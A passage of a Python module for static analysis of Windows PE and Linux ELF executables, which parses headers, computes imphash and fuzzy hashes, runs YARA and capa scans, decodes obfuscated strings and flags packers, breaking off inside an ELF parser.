_YARA_RULES_CACHE: Dict[str, Any] = {"path": None, "rules": None, "error": None}

PE_DLL_CHARACTERISTICS = {
    "high_entropy_va": 0x0020,
    "dynamic_base": 0x0040,
    "force_integrity": 0x0080,
    "nx_compat": 0x0100,
    "no_isolation": 0x0200,
    "no_seh": 0x0400,
    "no_bind": 0x0800,
    "app_container": 0x1000,
    "wdm_driver": 0x2000,
    "guard_cf": 0x4000,
    "terminal_server_aware": 0x8000,
}

PE_DEBUG_TYPES = {
    0: "UNKNOWN",
    1: "COFF",
    2: "CODEVIEW",
    3: "FPO",
    4: "MISC",
    5: "EXCEPTION",
    6: "FIXUP",
    7: "OMAP_TO_SRC",
    8: "OMAP_FROM_SRC",
    9: "BORLAND",
    10: "RESERVED10",
    11: "CLSID",
    12: "VC_FEATURE",
    13: "POGO",
    14: "ILTCG",
    15: "MPX",
    16: "REPRO",
}

ELF_DT_FLAGS = {
    0x1: "ORIGIN",
    0x2: "SYMBOLIC",
    0x4: "TEXTREL",
    0x8: "BIND_NOW",
    0x10: "STATIC_TLS",
}

ELF_DT_FLAGS_1 = {
    0x1: "NOW",
    0x2: "GLOBAL",
    0x4: "GROUP",
    0x8: "NODELETE",
    0x10: "LOADFLTR",
    0x20: "INITFIRST",
    0x40: "NOOPEN",
    0x80: "ORIGIN",
    0x100: "DIRECT",
    0x200: "TRANS",
    0x400: "INTERPOSE",
    0x800: "NODEFLIB",
}


def parse_rich_header(data: bytes) -> Optional[RichHeader]:
    """Parse the PE Rich header to extract compiler/linker information."""
    import hashlib
    
    try:
        # Find "Rich" marker
        rich_offset = data.find(b'Rich')
        if rich_offset == -1:
            return None
        
        # The XOR key follows "Rich"
        xor_key = struct.unpack('<I', data[rich_offset + 4:rich_offset + 8])[0]
        
        # Find "DanS" marker (start of Rich header, after XOR decryption)
        # The Rich header starts at the DOS stub end and is XOR encrypted
        # Look for the encrypted "DanS" signature
        dans_encrypted = struct.unpack('<I', b'DanS')[0] ^ xor_key
        
        # Search backwards from "Rich" to find the start
        start_offset = None
        for i in range(rich_offset - 4, 0x40, -4):  # Don't go before DOS header
            if struct.unpack('<I', data[i:i+4])[0] == dans_encrypted:
                start_offset = i
                break
        
        if start_offset is None:
            return None
        
        # Extract and decrypt the Rich header
        rich_data_encrypted = data[start_offset:rich_offset + 8]
        rich_data_decrypted = bytearray()
        
        for i in range(0, len(rich_data_encrypted) - 8, 4):  # Exclude "Rich" + key
            dword = struct.unpack('<I', rich_data_encrypted[i:i+4])[0]
            decrypted = dword ^ xor_key
            rich_data_decrypted.extend(struct.pack('<I', decrypted))
        
        # Parse entries (skip "DanS" + 3 padding DWORDs)
        entries = []
        for i in range(16, len(rich_data_decrypted), 8):  # Start after header (4 DWORDs = 16 bytes)
            if i + 8 > len(rich_data_decrypted):
                break
            
            compid = struct.unpack('<I', rich_data_decrypted[i:i+4])[0]
            count = struct.unpack('<I', rich_data_decrypted[i+4:i+8])[0]
            
            if compid == 0 and count == 0:
                continue
            
            # Extract product ID (high 16 bits) and build ID (low 16 bits)
            product_id = (compid >> 16) & 0xFFFF
            build_id = compid & 0xFFFF
            
            product_name = RICH_PRODUCT_IDS.get(product_id, f"Unknown ({product_id})")
            
            entries.append(RichHeaderEntry(
                product_id=product_id,
                build_id=build_id,
                count=count,
                product_name=product_name,
                vs_version=None,
            ))
        
        if not entries:
            return None
        
        # Calculate Rich hash (MD5 of clear text for malware identification)
        rich_hash = hashlib.md5(bytes(rich_data_decrypted)).hexdigest()
        
        return RichHeader(
            entries=entries,
            rich_hash=rich_hash,
            checksum=xor_key,
            raw_data=rich_data_encrypted.hex()[:200],  # Limit size
            clear_data=bytes(rich_data_decrypted).hex()[:200],  # Limit size
        )
        
    except Exception as e:
        logger.warning(f"Rich header parsing error: {e}")
        return None


def calculate_imphash(pe) -> Optional[str]:
    """Calculate the import hash (imphash) for PE malware identification."""
    try:
        return pe.get_imphash()
    except Exception as e:
        logger.warning(f"Imphash calculation error: {e}")
        return None


def _format_pe_version(version_ms: int, version_ls: int) -> str:
    return f"{version_ms >> 16}.{version_ms & 0xFFFF}.{version_ls >> 16}.{version_ls & 0xFFFF}"


def _extract_pe_version_info(pe) -> Dict[str, Any]:
    info: Dict[str, Any] = {}
    try:
        if hasattr(pe, "FileInfo"):
            for fileinfo in pe.FileInfo:
                if getattr(fileinfo, "Key", None) == b"StringFileInfo":
                    for st in fileinfo.StringTable:
                        for key, value in st.entries.items():
                            k = key.decode("utf-8", errors="ignore") if isinstance(key, bytes) else str(key)
                            v = value.decode("utf-8", errors="ignore") if isinstance(value, bytes) else str(value)
                            info[k] = v
    except Exception as e:
        logger.warning(f"PE version info parsing error: {e}")

    fixed_info = None
    try:
        if hasattr(pe, "VS_FIXEDFILEINFO") and pe.VS_FIXEDFILEINFO:
            fixed_info = pe.VS_FIXEDFILEINFO[0] if isinstance(pe.VS_FIXEDFILEINFO, list) else pe.VS_FIXEDFILEINFO
    except Exception:
        fixed_info = None

    if fixed_info:
        info.setdefault("FixedFileVersion", _format_pe_version(fixed_info.FileVersionMS, fixed_info.FileVersionLS))
        info.setdefault("FixedProductVersion", _format_pe_version(fixed_info.ProductVersionMS, fixed_info.ProductVersionLS))

    return info


def _extract_pe_resources(pe) -> Dict[str, Any]:
    if not hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
        return {}

    total_size = 0
    total_count = 0
    types: List[Dict[str, Any]] = []

    for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        type_name = None
        if entry.name:
            type_name = str(entry.name)
        elif entry.id is not None:
            type_name = PE_RESOURCE_TYPES.get(entry.id, f"TYPE_{entry.id}")
        else:
            type_name = "UNKNOWN"

        count = 0
        size = 0
        if hasattr(entry, "directory"):
            for res_id in entry.directory.entries:
                if hasattr(res_id, "directory"):
                    for lang in res_id.directory.entries:
                        if hasattr(lang, "data"):
                            size += lang.data.struct.Size
                            count += 1

        total_size += size
        total_count += count
        types.append({"type": type_name, "count": count, "size": size})

    types.sort(key=lambda x: x["count"], reverse=True)
    has_manifest = any(t["type"] == "RT_MANIFEST" for t in types)
    has_version_info = any(t["type"] == "RT_VERSION" for t in types)

    return {
        "types": types,
        "total_count": total_count,
        "total_size": total_size,
        "has_manifest": has_manifest,
        "has_version_info": has_version_info,
    }


def _read_pointer_at_rva(pe, rva: int, is_64bit: bool) -> Optional[int]:
    size = 8 if is_64bit else 4
    try:
        data = pe.get_data(rva, size)
    except Exception:
        return None
    if len(data) < size:
        return None
    fmt = "<Q" if is_64bit else "<I"
    return struct.unpack(fmt, data)[0]


def _extract_pe_tls_callbacks(pe) -> List[int]:
    callbacks: List[int] = []
    if not hasattr(pe, "DIRECTORY_ENTRY_TLS"):
        return callbacks

    try:
        tls_struct = pe.DIRECTORY_ENTRY_TLS.struct
        callbacks_va = getattr(tls_struct, "AddressOfCallBacks", 0)
        if not callbacks_va:
            return callbacks

        image_base = pe.OPTIONAL_HEADER.ImageBase
        callbacks_rva = callbacks_va - image_base
        if callbacks_rva < 0:
            return callbacks
        is_64bit = pe.OPTIONAL_HEADER.Magic == 0x20B

        for idx in range(64):
            ptr = _read_pointer_at_rva(pe, callbacks_rva + (idx * (8 if is_64bit else 4)), is_64bit)
            if not ptr:
                break
            callbacks.append(ptr)
    except Exception as e:
        logger.warning(f"TLS callback parsing error: {e}")

    return callbacks


def _extract_pe_mitigations(pe) -> Dict[str, Any]:
    mitigations: Dict[str, Any] = {}
    try:
        dll_chars = pe.OPTIONAL_HEADER.DllCharacteristics
        mitigations = {
            "aslr": bool(dll_chars & PE_DLL_CHARACTERISTICS["dynamic_base"]),
            "dep": bool(dll_chars & PE_DLL_CHARACTERISTICS["nx_compat"]),
            "cfg": bool(dll_chars & PE_DLL_CHARACTERISTICS["guard_cf"]),
            "high_entropy_va": bool(dll_chars & PE_DLL_CHARACTERISTICS["high_entropy_va"]),
            "force_integrity": bool(dll_chars & PE_DLL_CHARACTERISTICS["force_integrity"]),
            "no_seh": bool(dll_chars & PE_DLL_CHARACTERISTICS["no_seh"]),
            "app_container": bool(dll_chars & PE_DLL_CHARACTERISTICS["app_container"]),
            "terminal_server_aware": bool(dll_chars & PE_DLL_CHARACTERISTICS["terminal_server_aware"]),
            "dll_characteristics": f"0x{dll_chars:04x}",
        }
    except Exception as e:
        logger.warning(f"PE mitigation parsing error: {e}")
        return mitigations

    if hasattr(pe, "DIRECTORY_ENTRY_LOAD_CONFIG"):
        try:
            lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
            if hasattr(lc, "SEHandlerCount"):
                mitigations["safe_seh"] = lc.SEHandlerCount > 0
                mitigations["se_handler_count"] = lc.SEHandlerCount
            if hasattr(lc, "SecurityCookie"):
                mitigations["gs_cookie"] = bool(lc.SecurityCookie)
                mitigations["security_cookie"] = f"0x{lc.SecurityCookie:x}" if lc.SecurityCookie else None
            if hasattr(lc, "GuardFlags"):
                mitigations["guard_flags"] = f"0x{lc.GuardFlags:x}"
                mitigations["guard_flags_raw"] = lc.GuardFlags
        except Exception as e:
            logger.warning(f"PE load config parsing error: {e}")

    return mitigations


def _extract_pe_authenticode_info(file_path: Path, pe) -> Optional[Dict[str, Any]]:
    try:
        sec_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
        ]
    except Exception:
        return None

    if not sec_dir or sec_dir.VirtualAddress == 0 or sec_dir.Size == 0:
        return {"signed": False}

    info: Dict[str, Any] = {
        "signed": True,
        "certificate_offset": sec_dir.VirtualAddress,
        "directory_size": sec_dir.Size,
        "status": "present_unverified",
    }

    try:
        with open(file_path, "rb") as f:
            f.seek(sec_dir.VirtualAddress)
            header = f.read(8)
            if len(header) == 8:
                length, revision, cert_type = struct.unpack("<IHH", header)
                info["certificate_size"] = length
                info["revision"] = f"0x{revision:04x}"
                info["certificate_type_id"] = f"0x{cert_type:04x}"
                info["certificate_type"] = PE_CERTIFICATE_TYPES.get(cert_type, f"UNKNOWN (0x{cert_type:04x})")
    except Exception as e:
        info["status"] = f"parse_error: {e}"

    return info


def _extract_pe_overlay_info(pe) -> Optional[Dict[str, Any]]:
    try:
        overlay_offset = pe.get_overlay_data_start_offset()
        overlay_data = pe.get_overlay()
    except Exception:
        return None

    if overlay_offset is None or not overlay_data:
        return None

    return {"offset": overlay_offset, "size": len(overlay_data)}


def _extract_pe_data_directories(pe) -> List[Dict[str, Any]]:
    directories = []
    try:
        dir_map = {idx: name for name, idx in pefile.DIRECTORY_ENTRY.items()}
    except Exception:
        dir_map = {}

    try:
        for idx, entry in enumerate(pe.OPTIONAL_HEADER.DATA_DIRECTORY):
            if entry.VirtualAddress or entry.Size:
                name = dir_map.get(idx, f"DIR_{idx}")
                directories.append({
                    "name": name,
                    "virtual_address": entry.VirtualAddress,
                    "size": entry.Size,
                })
    except Exception as e:
        logger.warning(f"PE data directory parsing error: {e}")

    return directories


def _extract_pe_delay_imports(pe) -> List[Dict[str, Any]]:
    delay_imports = []
    if not hasattr(pe, "DIRECTORY_ENTRY_DELAY_IMPORT"):
        return delay_imports

    try:
        for entry in pe.DIRECTORY_ENTRY_DELAY_IMPORT:
            dll_name = entry.dll.decode("utf-8", errors="ignore") if entry.dll else "unknown"
            imports = []
            for imp in entry.imports:
                func_name = imp.name.decode("utf-8", errors="ignore") if imp.name else f"ordinal_{imp.ordinal}"
                imports.append({"name": func_name, "ordinal": imp.ordinal})
            delay_imports.append({
                "dll": dll_name,
                "count": len(imports),
                "imports": imports[:50],
            })
    except Exception as e:
        logger.warning(f"PE delay import parsing error: {e}")

    return delay_imports


def _extract_pe_relocations(pe) -> Dict[str, Any]:
    summary = {"total_blocks": 0, "total_entries": 0, "blocks": []}
    if not hasattr(pe, "DIRECTORY_ENTRY_BASERELOC"):
        return summary

    try:
        for block in pe.DIRECTORY_ENTRY_BASERELOC:
            summary["total_blocks"] += 1
            summary["total_entries"] += len(block.entries)
            if len(summary["blocks"]) < 10:
                entries = [
                    {"rva": entry.rva, "type": entry.type}
                    for entry in block.entries[:10]
                ]
                summary["blocks"].append({
                    "base_rva": block.struct.VirtualAddress,
                    "size": block.struct.SizeOfBlock,
                    "entries_count": len(block.entries),
                    "entries": entries,
                })
    except Exception as e:
        logger.warning(f"PE relocation parsing error: {e}")

    return summary


def _parse_codeview_debug(data: bytes) -> Dict[str, Any]:
    if data.startswith(b"RSDS") and len(data) > 24:
        guid = uuid.UUID(bytes_le=data[4:20])
        age = struct.unpack("<I", data[20:24])[0]
        pdb_path = data[24:].split(b"\x00", 1)[0].decode("utf-8", errors="ignore")
        return {
            "signature": "RSDS",
            "guid": str(guid),
            "age": age,
            "pdb_path": pdb_path,
        }
    if data.startswith(b"NB10") and len(data) > 16:
        age = struct.unpack("<I", data[12:16])[0]
        pdb_path = data[16:].split(b"\x00", 1)[0].decode("utf-8", errors="ignore")
        return {
            "signature": "NB10",
            "age": age,
            "pdb_path": pdb_path,
        }
    return {}


def _extract_pe_debug_info(pe, file_path: Path) -> Dict[str, Any]:
    debug_info = {"count": 0, "entries": []}
    if not hasattr(pe, "DIRECTORY_ENTRY_DEBUG"):
        return debug_info

    try:
        with open(file_path, "rb") as f:
            for entry in pe.DIRECTORY_ENTRY_DEBUG:
                debug_type = PE_DEBUG_TYPES.get(entry.struct.Type, str(entry.struct.Type))
                info = {
                    "type": debug_type,
                    "size": entry.struct.SizeOfData,
                    "timestamp": entry.struct.TimeDateStamp,
                }
                if debug_type == "CODEVIEW":
                    f.seek(entry.struct.PointerToRawData)
                    data = f.read(entry.struct.SizeOfData)
                    info.update(_parse_codeview_debug(data))
                debug_info["entries"].append(info)
                debug_info["count"] += 1
        debug_info["entries"] = debug_info["entries"][:10]
    except Exception as e:
        logger.warning(f"PE debug parsing error: {e}")

    return debug_info


def _extract_pe_manifest(pe) -> Optional[str]:
    if not hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
        return None

    try:
        for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
            entry_id = entry.id
            entry_name = str(entry.name) if entry.name else None
            if entry_id != 24 and entry_name != "RT_MANIFEST":
                continue
            if not hasattr(entry, "directory"):
                continue
            for res_id in entry.directory.entries:
                if not hasattr(res_id, "directory"):
                    continue
                for lang in res_id.directory.entries:
                    if not hasattr(lang, "data"):
                        continue
                    data = pe.get_data(lang.data.struct.OffsetToData, lang.data.struct.Size)
                    if not data:
                        continue
                    if b"\x00" in data[:50]:
                        text = data.decode("utf-16-le", errors="ignore")
                    else:
                        text = data.decode("utf-8", errors="ignore")
                    text = text.strip()
                    return text[:4000]
    except Exception as e:
        logger.warning(f"PE manifest parsing error: {e}")

    return None


def _parse_imports_with_lief(file_path: Path) -> tuple[List[ImportedFunction], List[str], Dict[str, Any]]:
    if not LIEF_AVAILABLE:
        return [], [], {}

    try:
        binary = lief.parse(str(file_path))
    except Exception as e:
        logger.warning(f"LIEF parsing failed: {e}")
        return [], [], {}

    if binary is None:
        return [], [], {}

    imports: List[ImportedFunction] = []
    exports: List[str] = []
    metadata_updates: Dict[str, Any] = {}

    try:
        if getattr(binary, "format", None) == lief.EXE_FORMATS.PE:
            for imp in getattr(binary, "imports", []):
                dll_name = getattr(imp, "name", "unknown")
                for entry in getattr(imp, "entries", []):
                    func_name = entry.name or f"ordinal_{entry.ordinal}"
                    reason = SUSPICIOUS_IMPORTS.get(func_name)
                    if not reason:
                        reason = SUSPICIOUS_IMPORTS.get(func_name.lower())
                    imports.append(ImportedFunction(
                        name=func_name,
                        library=dll_name,
                        ordinal=getattr(entry, "ordinal", None),
                        is_suspicious=bool(reason),
                        reason=reason,
                    ))

            for exp in getattr(binary, "exported_functions", []):
                if exp:
                    exports.append(str(exp))
        elif getattr(binary, "format", None) == lief.EXE_FORMATS.ELF:
            for func_name in getattr(binary, "imported_functions", []):
                reason = SUSPICIOUS_IMPORTS.get(func_name)
                if not reason:
                    reason = SUSPICIOUS_IMPORTS.get(func_name.lower())
                imports.append(ImportedFunction(
                    name=str(func_name),
                    library="(ELF import)",
                    is_suspicious=bool(reason),
                    reason=reason,
                ))
            for exp in getattr(binary, "exported_functions", []):
                if exp:
                    exports.append(str(exp))

            libs = getattr(binary, "libraries", None)
            if libs:
                metadata_updates["linked_libraries"] = [str(lib) for lib in libs]
    except Exception as e:
        logger.warning(f"LIEF import parsing error: {e}")

    return imports, exports, metadata_updates


def _load_yara_rules() -> Optional[Any]:
    if not YARA_AVAILABLE:
        return None

    rules_path = getattr(settings, "yara_rules_path", "") or ""
    if _YARA_RULES_CACHE["rules"] is not None and _YARA_RULES_CACHE["path"] == rules_path:
        return _YARA_RULES_CACHE["rules"]

    if not rules_path:
        return None

    path = Path(rules_path)
    if not path.exists():
        return None

    try:
        if path.is_file():
            rules = yara.compile(filepath=str(path))
        else:
            rule_files = sorted([p for p in path.rglob("*.yar")] + [p for p in path.rglob("*.yara")])
            if not rule_files:
                return None
            file_map = {p.stem: str(p) for p in rule_files}
            rules = yara.compile(filepaths=file_map)
        _YARA_RULES_CACHE.update({"path": rules_path, "rules": rules, "error": None})
        return rules
    except Exception as e:
        _YARA_RULES_CACHE.update({"path": rules_path, "rules": None, "error": str(e)})
        logger.warning(f"YARA rule compilation failed: {e}")
        return None


def _format_yara_matches(matches: List[Any]) -> List[Dict[str, Any]]:
    formatted = []
    for match in matches:
        try:
            meta = {}
            for k, v in getattr(match, "meta", {}).items():
                meta[str(k)] = str(v)
            tags = [str(t) for t in getattr(match, "tags", [])]
            string_ids = []
            for s in getattr(match, "strings", [])[:5]:
                if hasattr(s, "identifier"):
                    string_ids.append(s.identifier)
                elif isinstance(s, (tuple, list)) and len(s) > 1:
                    string_ids.append(str(s[1]))
            formatted.append({
                "rule": match.rule,
                "tags": tags,
                "meta": meta,
                "strings": string_ids,
            })
        except Exception:
            continue
    return formatted


def _run_yara_scan(data: bytes, file_path: Path) -> List[Dict[str, Any]]:
    rules = _load_yara_rules()
    if not rules:
        return []

    try:
        matches = rules.match(data=data, filepath=str(file_path))
        return _format_yara_matches(matches)
    except Exception as e:
        logger.warning(f"YARA scan failed: {e}")
        return []


def _run_capa_scan(file_path: Path) -> Optional[Dict[str, Any]]:
    capa_path = getattr(settings, "capa_path", "") or "capa"
    capa_enabled = getattr(settings, "enable_capa", True)
    if not capa_enabled:
        return None

    exe_path = shutil.which(capa_path)
    if not exe_path:
        return None

    try:
        if file_path.stat().st_size > 50 * 1024 * 1024:
            return {"error": "File too large for capa scan"}
    except Exception:
        pass

    commands = [
        [exe_path, "--json", str(file_path)],
        [exe_path, "-j", str(file_path)],
    ]
    completed = None
    for cmd in commands:
        try:
            completed = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        except Exception as e:
            return {"error": f"capa execution failed: {e}"}
        if completed.returncode == 0:
            break

    if not completed or completed.returncode != 0:
        return {"error": completed.stderr.strip()[:2000] if completed else "capa failed"}

    try:
        data = json.loads(completed.stdout)
    except Exception as e:
        return {"error": f"capa output parse error: {e}"}

    rules = data.get("rules", {})
    capabilities: List[str] = []
    namespaces = set()
    attacks = set()
    mbc = set()

    for rule_name, rule in rules.items():
        meta = rule.get("meta", {})
        capabilities.append(meta.get("name") or rule_name)
        namespace = meta.get("namespace") or rule.get("namespace")
        if namespace:
            namespaces.add(namespace)
        for entry in meta.get("att&ck", []) or meta.get("attack", []):
            attacks.add(str(entry))
        for entry in meta.get("mbc", []) or []:
            mbc.add(str(entry))

    return {
        "rule_count": len(rules),
        "capabilities": capabilities[:100],
        "namespaces": sorted(namespaces),
        "attacks": sorted(attacks),
        "mbc": sorted(mbc),
        "analysis_meta": data.get("meta", {}),
    }


def _compute_fuzzy_hashes(data: bytes) -> Dict[str, Optional[str]]:
    hashes: Dict[str, Optional[str]] = {}
    if SSDEEP_AVAILABLE:
        try:
            hashes["ssdeep"] = ssdeep.hash(data)
        except Exception as e:
            logger.warning(f"ssdeep hashing failed: {e}")
    if TLSH_AVAILABLE:
        try:
            if len(data) >= 256:
                hashes["tlsh"] = tlsh.hash(data)
        except Exception as e:
            logger.warning(f"TLSH hashing failed: {e}")
    return hashes


def _printable_ratio(text: str) -> float:
    if not text:
        return 0.0
    printable = sum(1 for ch in text if ch in string.printable)
    return printable / max(len(text), 1)


def _pad_base64(value: str) -> str:
    padding = (-len(value)) % 4
    if padding:
        return value + ("=" * padding)
    return value


def _deobfuscate_strings(strings: List[ExtractedString], limit: int = 50) -> List[Dict[str, Any]]:
    results: List[Dict[str, Any]] = []
    seen: set[str] = set()

    base64_re = re.compile(r"^[A-Za-z0-9+/]{16,}={0,2}$")
    base64_url_re = re.compile(r"^[A-Za-z0-9_-]{16,}={0,2}$")
    hex_re = re.compile(r"^(?:0x)?[0-9a-fA-F]{16,}$")

    def add_result(method: str, original: str, decoded: str, confidence: float, extra: Optional[Dict[str, Any]] = None) -> None:
        key = f"{method}:{decoded}"
        if key in seen:
            return
        seen.add(key)
        payload = {
            "method": method,
            "original": original[:200],
            "decoded": decoded[:2000],
            "confidence": round(confidence, 2),
        }
        if extra:
            payload.update(extra)
        results.append(payload)

    def best_single_byte_xor(data_bytes: bytes) -> Optional[Dict[str, Any]]:
        if not data_bytes or len(data_bytes) > 256:
            return None
        best = None
        best_ratio = 0.0
        for key in range(1, 256):
            decoded_bytes = bytes(b ^ key for b in data_bytes)
            decoded = decoded_bytes.decode("utf-8", errors="ignore")
            ratio = _printable_ratio(decoded)
            if ratio > best_ratio:
                best_ratio = ratio
                best = {"decoded": decoded, "key": key, "ratio": ratio}
        if best and best_ratio >= 0.9:
            return best
        return None

    for s in strings[:1000]:
        if len(results) >= limit:
            break
        value = s.value.strip()
        if len(value) < 8:
            continue

        if base64_re.match(value) or base64_url_re.match(value):
            for decoder in (base64.b64decode, base64.urlsafe_b64decode):
                try:
                    decoded_bytes = decoder(_pad_base64(value))
                    decoded = decoded_bytes.decode("utf-8", errors="ignore")
                    ratio = _printable_ratio(decoded)
                    if ratio >= 0.85 and len(decoded) >= 6:
                        add_result("base64", value, decoded, ratio)
                except (binascii.Error, ValueError):
                    continue

        if hex_re.match(value):
            hex_value = value[2:] if value.lower().startswith("0x") else value
            try:
                decoded_bytes = bytes.fromhex(hex_value)
                decoded = decoded_bytes.decode("utf-8", errors="ignore")
                ratio = _printable_ratio(decoded)
                if ratio >= 0.85 and len(decoded) >= 6:
                    add_result("hex", value, decoded, ratio)
                xor_best = best_single_byte_xor(decoded_bytes)
                if xor_best:
                    add_result("xor", value, xor_best["decoded"], xor_best["ratio"], {"key": xor_best["key"]})
            except (ValueError, binascii.Error):
                pass

        if value.isalpha() and len(value) <= 120:
            rot13 = value.translate(str.maketrans(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
            ))
            ratio = _printable_ratio(rot13)
            if ratio >= 0.9 and rot13.lower() != value.lower():
                add_result("rot13", value, rot13, ratio)

    return results


def parse_pe_with_pefile(file_path: Path) -> tuple[Optional[BinaryMetadata], List[ImportedFunction], List[str]]:
    """Parse PE file using pefile library for comprehensive analysis."""
    if not PEFILE_AVAILABLE:
        return None, [], []
    
    try:
        pe = pefile.PE(str(file_path))
        try:
            directory_keys = [
                "IMAGE_DIRECTORY_ENTRY_IMPORT",
                "IMAGE_DIRECTORY_ENTRY_EXPORT",
                "IMAGE_DIRECTORY_ENTRY_RESOURCE",
                "IMAGE_DIRECTORY_ENTRY_TLS",
                "IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG",
                "IMAGE_DIRECTORY_ENTRY_BASERELOC",
                "IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT",
                "IMAGE_DIRECTORY_ENTRY_DEBUG",
            ]
            directories = [
                pefile.DIRECTORY_ENTRY[key]
                for key in directory_keys
                if key in pefile.DIRECTORY_ENTRY
            ]
            pe.parse_data_directories(directories=directories)
        except Exception:
            pass
        
        # Architecture
        arch_map = {
            # x86 family
            pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386']: "x86",
            pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_AMD64']: "x64",
            # ARM family
            pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_ARM']: "ARM",
            pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_ARM64']: "ARM64",
        }
        # Add ARM Thumb if available
        if 'IMAGE_FILE_MACHINE_THUMB' in pefile.MACHINE_TYPE:
            arch_map[pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_THUMB']] = "ARM_THUMB"
        # Add RISC-V if available (newer pefile versions)
        if 'IMAGE_FILE_MACHINE_RISCV32' in pefile.MACHINE_TYPE:
            arch_map[pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_RISCV32']] = "RISCV32"
        if 'IMAGE_FILE_MACHINE_RISCV64' in pefile.MACHINE_TYPE:
            arch_map[pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_RISCV64']] = "RISCV64"
        # Add PowerPC if available
        if 'IMAGE_FILE_MACHINE_POWERPC' in pefile.MACHINE_TYPE:
            arch_map[pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_POWERPC']] = "PPC"
        architecture = arch_map.get(pe.FILE_HEADER.Machine, f"unknown (0x{pe.FILE_HEADER.Machine:x})")
        
        # Entry point
        entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        
        # Compile time
        import datetime
        compile_time = datetime.datetime.utcfromtimestamp(pe.FILE_HEADER.TimeDateStamp).isoformat()
        
        # Sections with entropy calculation
        sections = []
        high_entropy_sections = 0
        for section in pe.sections:
            name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            entropy = section.get_entropy()
            sections.append({
                "name": name,
                "virtual_address": section.VirtualAddress,
                "virtual_size": section.Misc_VirtualSize,
                "raw_size": section.SizeOfRawData,
                "raw_offset": section.PointerToRawData,
                "pointer_to_raw": section.PointerToRawData,
                "entropy": round(entropy, 2),
                "characteristics": f"0x{section.Characteristics:08x}",
            })
            if entropy > 7.0:
                high_entropy_sections += 1
        
        # Check for packing
        is_packed = False
        packer_name = None
        section_names_lower = [s["name"].lower() for s in sections]
        
        if "upx0" in section_names_lower or "upx1" in section_names_lower:
            is_packed = True
            packer_name = "UPX"
        elif ".aspack" in section_names_lower:
            is_packed = True
            packer_name = "ASPack"
        elif ".themida" in section_names_lower:
            is_packed = True
            packer_name = "Themida"
        elif ".vmp" in section_names_lower:
            is_packed = True
            packer_name = "VMProtect"
        elif ".nsp" in section_names_lower:
            is_packed = True
            packer_name = "NSPack"
        elif high_entropy_sections > len(sections) / 2:
            is_packed = True
            packer_name = f"Unknown (high entropy in {high_entropy_sections}/{len(sections)} sections)"
        
        # Parse imports
        imports = []
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode('utf-8', errors='ignore')
                for imp in entry.imports:
                    if imp.name:
                        func_name = imp.name.decode('utf-8', errors='ignore')
                        is_suspicious = func_name in SUSPICIOUS_IMPORTS
                        imports.append(ImportedFunction(
                            name=func_name,
                            library=dll_name,
                            ordinal=imp.ordinal,
                            is_suspicious=is_suspicious,
                            reason=SUSPICIOUS_IMPORTS.get(func_name),
                        ))
        
        # Parse exports
        exports = []
        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name:
                    exports.append(exp.name.decode('utf-8', errors='ignore'))
        
        # Parse Rich header for compiler/linker information
        with open(file_path, 'rb') as f:
            raw_data = f.read(0x1000)  # Rich header is in first 4KB
        rich_header = parse_rich_header(raw_data)
        
        # Calculate imphash for malware identification
        imphash = calculate_imphash(pe)

        tls_callbacks = _extract_pe_tls_callbacks(pe)
        mitigations = _extract_pe_mitigations(pe)
        resource_summary = _extract_pe_resources(pe)
        version_info = _extract_pe_version_info(pe)
        authenticode = _extract_pe_authenticode_info(file_path, pe)
        overlay = _extract_pe_overlay_info(pe)
        pe_delay_imports = _extract_pe_delay_imports(pe)
        pe_relocations = _extract_pe_relocations(pe)
        pe_debug = _extract_pe_debug_info(pe, file_path)
        pe_data_directories = _extract_pe_data_directories(pe)
        pe_manifest = _extract_pe_manifest(pe)
        
        metadata = BinaryMetadata(
            file_type="PE (Windows Executable)",
            architecture=architecture,
            file_size=pe.DOS_HEADER.e_lfanew + pe.FILE_HEADER.sizeof() + pe.OPTIONAL_HEADER.sizeof(),
            entry_point=entry_point,
            is_packed=is_packed,
            packer_name=packer_name,
            compile_time=compile_time,
            sections=sections,
            headers={
                "machine": f"0x{pe.FILE_HEADER.Machine:x}",
                "characteristics": f"0x{pe.FILE_HEADER.Characteristics:x}",
                "subsystem": pe.OPTIONAL_HEADER.Subsystem,
                "dll_characteristics": f"0x{pe.OPTIONAL_HEADER.DllCharacteristics:x}",
            },
            rich_header=rich_header,
            imphash=imphash,
            tls_callbacks=tls_callbacks,
            mitigations=mitigations,
            resource_summary=resource_summary,
            version_info=version_info,
            authenticode=authenticode,
            overlay=overlay,
            pe_delay_imports=pe_delay_imports,
            pe_relocations=pe_relocations,
            pe_debug=pe_debug,
            pe_data_directories=pe_data_directories,
            pe_manifest=pe_manifest,
        )
        
        pe.close()
        return metadata, imports, exports
        
    except Exception as e:
        logger.error(f"pefile parsing error: {e}")
        return None, [], []


def parse_elf_header(data: bytes) -> Optional[BinaryMetadata]:
    """Parse ELF (Linux executable) header - basic fallback parser."""
    try:
        # Check ELF magic
        if data[:4] != b'\x7fELF':
            return None
        
        # Get ELF class (32 or 64 bit)
        ei_class = data[4]
